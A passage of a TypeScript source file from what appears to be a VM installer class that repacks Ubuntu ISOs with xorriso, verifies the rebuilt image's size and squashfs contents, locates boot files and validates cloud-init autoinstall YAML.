    if (!fs.existsSync(path.join(extractDir, 'EFI/boot/bootx64.efi'))) {
      this.debug.warn('[ISO] EFI boot image not found at EFI/boot/bootx64.efi')
    }

    // Get dynamic xorriso parameters from the original ISO. The El Torito boot
    // geometry (appended GPT partition byte ranges, ESP eltorito image) is
    // ISO-VERSION-SPECIFIC, so it MUST be read from the actual base ISO.
    const dynamicParams = await this.getXorrisoParamsFromISO(this.isoPath as string)

    // FAIL LOUDLY if we could not extract real boot parameters. The previous code
    // fell back to HARDCODED sector/byte constants (--interval:local_fs:4087764d-…,
    // appended_partition_2_start_1021941s_size_10128d) frozen to one old Ubuntu
    // release; applied to any other/newer ISO they read the wrong byte ranges and
    // stamp a wrong-sized appended GPT + ESP → a SILENTLY non-bootable ISO. Refuse
    // to fabricate geometry: a loud error is surfaced by create() as an actionable
    // failure instead of shipping a VM that never boots.
    if (!this.hasBootAnchors(dynamicParams)) {
      throw new Error(
        `Failed to extract El Torito boot parameters from base ISO '${this.isoPath}' ` +
        '(xorriso -report_el_torito produced no usable -b/-e/-append_partition anchors). ' +
        'Refusing to fabricate boot geometry, which would silently produce a NON-BOOTABLE ISO. ' +
        'Ensure xorriso is installed and the base ISO is a valid hybrid (BIOS+UEFI) image.'
      )
    }

    this.debug.debug('[XORRISO] Using dynamic parameters extracted from original ISO')
    // The --interval targets in dynamicParams reference the ORIGINAL base ISO by
    // its absolute path (this.isoPath) for the appended-partition byte reads; the
    // extractDir is grafted as the ISO root. (The old per-param map was a no-op.)
    const isoCreationCommandParts: string[] = [
      'xorriso',
      '-as', 'mkisofs',
      ...dynamicParams,
      '-o', newIsoPath,
      extractDir
    ]

    // Use the executeCommand method from the parent class
    try {
      this.debug.debug(`[XORRISO] Creating ISO with command:\n${isoCreationCommandParts.join(' ')}`)
      await this.executeCommand(isoCreationCommandParts)
      this.debug.debug(`[ISO] Created ISO successfully at ${newIsoPath}`)

      // Post-build integrity gate: confirm the squashfs the chosen install source
      // depends on actually survived the extract+repack, and the output is sane in
      // size vs the base. Runs BEFORE we delete extractDir so a failure is loud and
      // the VM is failed (status=error) rather than booting a broken/empty image.
      await this.verifyGeneratedIso(newIsoPath)

      // Remove the extracted directory
      await this.executeCommand(['rm', '-rf', extractDir])
      this.debug.debug(`[ISO] Removed extracted directory ${extractDir}`)
    } catch (error) {
      this.debug.error(`[ISO] Failed to create ISO: ${error}`)
      throw error
    }
  }

  /**
   * True when the extracted xorriso params carry the boot anchors a modern hybrid
   * Ubuntu ISO needs: a boot image (-b BIOS El Torito or -e ESP) AND the appended
   * GPT partition (-append_partition) that holds the EFI system partition. Missing
   * either means report_el_torito under-collected (or failed) and we must NOT
   * proceed with a fabricated/partial geometry.
   */
  private hasBootAnchors (params: string[]): boolean {
    if (!params || params.length === 0) return false
    const hasBootImage = params.includes('-b') || params.includes('-e')
    const hasAppendedPart = params.includes('-append_partition')
    return hasBootImage && hasAppendedPart
  }

  /**
   * Verify the freshly-built ISO actually contains the squashfs image(s) the chosen
   * install source needs, and is not implausibly smaller than the base (the exact
   * fingerprint of the shipped bug: a 3.4GB output from a 6.5GB desktop base). Throws
   * an actionable error on any violation. Best-effort/no-op when we have no detected
   * source (e.g. a distro without a casper install-sources.yaml).
   */
  private async verifyGeneratedIso (newIsoPath: string): Promise<void> {
    // 1. Whole-ISO size sanity vs the base ISO.
    try {
      const [outStat, baseStat] = await Promise.all([
        fsPromises.stat(newIsoPath),
        fsPromises.stat(this.isoPath as string)
      ])
      const ratio = outStat.size / baseStat.size
      if (ratio < 0.85 || ratio > 1.25) {
        throw new Error(
          `Generated ISO ${newIsoPath} is ${(outStat.size / 1e9).toFixed(2)}GB vs base ` +
          `${(baseStat.size / 1e9).toFixed(2)}GB (ratio ${ratio.toFixed(2)}). This is outside the ` +
          'sane [0.85, 1.25] range and indicates the base was mis-selected or content was dropped ' +
          'during extract/repack (e.g. the install squashfs was truncated). Refusing to ship it.'
        )
      }
    } catch (err) {
      if (err instanceof Error && err.message.includes('outside the')) throw err
      this.debug.warn(`[VERIFY] Could not stat ISOs for size sanity (${String(err)}); skipping size check`)
    }

    // 2. Required-squashfs presence. Resolve the chosen source's on-ISO path and,
    // for fsimage-layered desktop sources, the base minimal layer it stacks on.
    const info = this.detectedSourceInfo
    if (!info || !info.path) {
      this.debug.debug('[VERIFY] No detected install source with a squashfs path; skipping presence check')
      return
    }
    const toCasper = (p: string): string => (p.startsWith('casper/') ? p : `casper/${p}`)
    const required = new Set<string>([toCasper(info.path)])
    if (info.type.includes('layered') && info.variant === 'desktop') {
      // A layered full desktop stacks on the minimal desktop squashfs — require it too.
      const baseLayer = this.allSources.find(s => s.variant === 'desktop' && s.minimal && s.path)
      if (baseLayer) required.add(toCasper(baseLayer.path))
    }

    let listing: string
    try {
      listing = await this.executeCommand(['7z', 'l', newIsoPath])
    } catch (err) {
      this.debug.warn(`[VERIFY] Could not list generated ISO to verify squashfs presence (${String(err)}); skipping presence check`)
      return
    }
    const missing = [...required].filter(p => !listing.includes(p))
    if (missing.length > 0) {
      throw new Error(
        `Generated ISO ${newIsoPath} is MISSING squashfs required by install source '${info.id}': ` +
        `${missing.join(', ')}. The install would produce a broken/near-empty system. ` +
        'This usually means the extract ran out of space or the base ISO changed layout.'
      )
    }
    this.debug.debug(`[VERIFY] Generated ISO contains required squashfs for '${info.id}': ${[...required].join(', ')}`)
  }

  /**
   * Recursively searches for files matching a pattern within a directory.
   *
   * @param {string} baseDir - The base directory to start the search from
   * @param {string} dir - The current directory being searched
   * @param {RegExp} pattern - Regular expression pattern to match filenames
   * @returns {Promise<string[]>} - Array of paths relative to the extractDir
   */
  private async findBootFiles (dir: string, pattern: RegExp, extractDir?: string): Promise<string[]> {
    const results: string[] = []
    let files: fs.Dirent[]

    try {
      files = await fsPromises.readdir(dir, { withFileTypes: true })
    } catch (error) {
      this.debug.error(`Failed to read directory ${dir}: ${error}`)
      return results
    }

    for (const file of files) {
      const fullPath = path.join(dir, file.name)

      try {
        if (file.isDirectory()) {
          const subResults = await this.findBootFiles(fullPath, pattern, extractDir || dir)
          results.push(...subResults)
        } else if (pattern.test(file.name)) {
          // If extractDir is provided, make the path relative to it
          // Otherwise, just use the filename
          const relativePath = extractDir
            ? path.relative(extractDir, fullPath)
            : file.name

          results.push(relativePath)
          this.debug.debug(`Found boot file: ${relativePath}`)
        }
      } catch (error) {
        this.debug.warn(`Error processing ${fullPath}: ${error}`)
      }
    }

    return results
  }

  /**
   * Validates the cloud-init YAML configuration.
   * Checks for valid YAML syntax and required autoinstall fields.
   * @param {string} configContent - The YAML configuration content
   * @returns {Promise<{ valid: boolean; errors: string[] }>} Validation result
   */
  protected async validateConfig (configContent: string): Promise<{ valid: boolean; errors: string[] }> {
    const errors: string[] = []

    try {
      // Parse YAML to check syntax
      const parsed = yaml.load(configContent) as Record<string, any> | null

      // Check required structure
      if (!parsed) {
        errors.push('Configuration is empty or invalid YAML')
        return { valid: false, errors }
      }

      if (!parsed.autoinstall) {
        errors.push('Missing required "autoinstall" section')
      } else {
        // Check required autoinstall fields
        if (typeof parsed.autoinstall.version !== 'number') {
          errors.push('Missing or invalid "autoinstall.version" field')
        }

        if (!parsed.autoinstall.identity) {
          errors.push('Missing required "autoinstall.identity" section')
        } else {
          if (!parsed.autoinstall.identity.username) {
            errors.push('Missing "autoinstall.identity.username"')
          }
          if (!parsed.autoinstall.identity.password) {
            errors.push('Missing "autoinstall.identity.password"')
          }
        }
      }

      if (errors.length > 0) {
        return { valid: false, errors }
      }

      this.debug.debug('Cloud-init YAML validation passed')
      return { valid: true, errors: [] }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error)
      errors.push(`YAML parsing error: ${errorMsg}`)
      return { valid: false, errors }
    }
  }
}

// Back-compat alias: this installer was formerly distro-named.
export { CloudInitInstaller as UnattendedUbuntuManager }
